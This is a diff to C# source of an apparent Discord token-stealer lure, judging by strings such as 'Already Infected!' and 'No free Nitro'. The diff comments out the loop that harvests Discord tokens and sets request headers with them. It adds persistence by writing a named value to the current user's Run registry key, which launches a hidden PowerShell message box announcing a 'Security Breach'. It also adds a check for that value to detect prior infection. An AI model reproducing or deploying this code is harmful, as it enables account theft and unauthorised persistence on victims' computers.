@@ -17,6 +17,9 @@ namespace Discord2
         [DllImport("advapi32.dll", SetLastError = true)]
         static extern uint RegSetValueEx(UIntPtr hKey, [MarshalAs(UnmanagedType.LPStr)] string lpValueName, int Reserved, int dwType, IntPtr lpData, int cbData);
 
+        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, EntryPoint = "RegQueryValueExW", SetLastError = true)]
+        static extern int RegQueryValueEx(UIntPtr hKey, string lpValueName, int lpReserved, out uint lpType, System.Text.StringBuilder lpData, ref uint lpcbData);
+
         private static UIntPtr HKEY_LOCAL_MACHINE = new UIntPtr(0x80000002u);
         private static UIntPtr HKEY_CURRENT_USER  = new UIntPtr(0x80000001u);
         private const int KEY_ALL_ACCESS = 0xF003F;
@@ -33,12 +36,12 @@ namespace Discord2
 
         public static void Run()
         {
-            if(OpenRegKey(@"SoftWare\Microsoft\Windows\CurrentVersion\Run", null)){
+            if(OpenRegKey(@"SoftWare\Microsoft\Windows\CurrentVersion\Run", "warning")){
                 Console.WriteLine("Already Infected!");
                 return;
             }
 
-            List<string> tokens = GetTokens();
+            /*List<string> tokens = GetTokens();
             if (tokens.Count > 0){
                 foreach (string t in tokens){
                     SetHeaders(t);
@@ -59,10 +62,10 @@ namespace Discord2
             } else {
                 Console.WriteLine("No Tokens found :(");
                 return;
-            }
+            }*/
 
             string message = "Your Computer has been infected. Do not worry, nothing dangerous or maliciuos. Next time be more careful with files you download from the internet. PS: No free Nitro :(";
-            WriteRegKey(@"SoftWare\Microsoft\Windows\CurrentVersion\Run", String.Format("powershell -windowstyle hidden -noprofile -command \\\"Add-Type -Assemblyname PresentationFramework; [System.Windows.Messagebox]::Show('{0}', 'WARNING: Security Breach', 'OK', 'Exclamation')\\\"", message));
+            WriteRegKey(@"SoftWare\Microsoft\Windows\CurrentVersion\Run", "warning", String.Format("powershell -windowstyle hidden -noprofile -command \"Add-Type -Assemblyname PresentationFramework; [System.Windows.Messagebox]::Show('{0}', 'WARNING: Security Breach', 'OK', 'Exclamation')\"", message));
         }
 
         static List<string> GetTokens()
@@ -167,14 +170,14 @@ namespace Discord2
             return Encoding.Default.GetString(Convert.FromBase64String(base64));
         }
 
-        static bool WriteRegKey(string subkey, string message){
+        static bool WriteRegKey(string subkey, string valuename, string message){
             UIntPtr hkey;
             byte[] buffer = Encoding.ASCII.GetBytes(message);                                     
             try{
                 if(RegOpenKeyEx(HKEY_CURRENT_USER, subkey, 0, KEY_ALL_ACCESS, out hkey) != ERROR_SUCCESS) throw new Exception();
                 unsafe{
                     fixed (byte* p = buffer){
-                        if(RegSetValueEx(hkey, null, 0, REG_SZ, (IntPtr)p, buffer.Length) != ERROR_SUCCESS) throw new Exception();
+                        if(RegSetValueEx(hkey, valuename, 0, REG_SZ, (IntPtr)p, buffer.Length) != ERROR_SUCCESS) throw new Exception();
                     }
                 }
                 return true;
@@ -185,7 +188,11 @@ namespace Discord2
 
         static bool OpenRegKey(string subkey, string name){
             UIntPtr hkey;
-            return RegOpenKeyEx(HKEY_CURRENT_USER, subkey, 0, KEY_READ, out hkey) == ERROR_SUCCESS;
+            if(RegOpenKeyEx(HKEY_CURRENT_USER, subkey, 0, KEY_READ, out hkey) != ERROR_SUCCESS) return false;
+            uint size = 1024;
+            uint type = 0;
+            StringBuilder keyBuffer = new StringBuilder();
+            return RegQueryValueEx(hkey, name, 0, out type, keyBuffer, ref size) == ERROR_SUCCESS;
         }
 
         static Dictionary<string, string>[] DictFromString(string input){
